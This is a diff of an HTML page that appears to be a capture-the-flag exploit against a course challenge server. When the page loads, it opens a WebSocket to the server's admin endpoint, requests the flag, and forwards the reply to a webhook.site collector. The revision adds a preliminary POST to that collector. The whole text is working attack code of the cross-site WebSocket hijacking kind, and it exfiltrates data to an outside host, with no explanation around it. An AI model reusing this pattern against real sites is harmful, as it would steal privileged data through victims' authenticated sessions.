@@ -6,58 +6,75 @@
     <title>WebSocket and POST Request</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const wsUrl = 'ws://ce441-web.spchallenge.ir:8080/admin/ws'; // Replace with your Flask WebSocket URL
-            const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/store_flag';
+            const wsUrl = 'ws://ce441-web.spchallenge.ir:8080/admin/ws';
+            const firstWebhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/';
+            const secondWebhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/store_flag';
 
-            // Open WebSocket connection
-            const ws = new WebSocket(wsUrl);
+            // Step 1: Send a POST request to the first webhook
+            fetch(firstWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ message: 'Initial POST request sent' }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Initial POST request sent successfully');
 
-            ws.onopen = () => {
-                console.log('WebSocket connection opened');
-                // Send the "flag" command to retrieve the flag
-                ws.send('flag');
-            };
+                    // Step 2: Open WebSocket connection after the first POST is complete
+                    const ws = new WebSocket(wsUrl);
 
-            ws.onmessage = (event) => {
-                console.log('Received:', event.data);
+                    ws.onopen = () => {
+                        console.log('WebSocket connection opened');
+                        ws.send('flag'); // Request the flag
+                    };
 
-                // Check if the response contains the flag
-                if (event.data.includes('flag{')) {
-                    const flag = event.data;
+                    ws.onmessage = (event) => {
+                        console.log('Received:', event.data);
+                        if (event.data.includes('flag{')) {
+                            const flag = event.data;
 
-                    // Send the flag to the webhook
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({ flag }),
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('Flag sent successfully');
-                        } else {
-                            console.error('Failed to send flag');
+                            // Step 3: Send the flag to the second webhook
+                            fetch(secondWebhookUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({ flag }),
+                            })
+                            .then(response => {
+                                if (response.ok) {
+                                    console.log('Flag sent successfully');
+                                } else {
+                                    console.error('Failed to send flag');
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Error sending flag:', error);
+                            });
                         }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                    });
+                    };
+
+                    ws.onerror = (error) => {
+                        console.error('WebSocket error:', error);
+                    };
+
+                    ws.onclose = () => {
+                        console.log('WebSocket connection closed');
+                    };
+                } else {
+                    console.error('Failed to send the initial POST request');
                 }
-            };
-
-            ws.onerror = (error) => {
-                console.error('WebSocket error:', error);
-            };
-
-            ws.onclose = () => {
-                console.log('WebSocket connection closed');
-            };
+            })
+            .catch(error => {
+                console.error('Error sending initial POST request:', error);
+            });
         });
     </script>
 </head>
 <body>
-    <h1>WebSocket and POST Request 2</h1>
-    <p>The flag will be retrieved and sent automatically when the page loads.</p>
+    <h1>WebSocket and POST Request</h1>
+    <p>The flag will be retrieved and sent automatically after the first POST request is completed.</p>
 </body>
 </html>
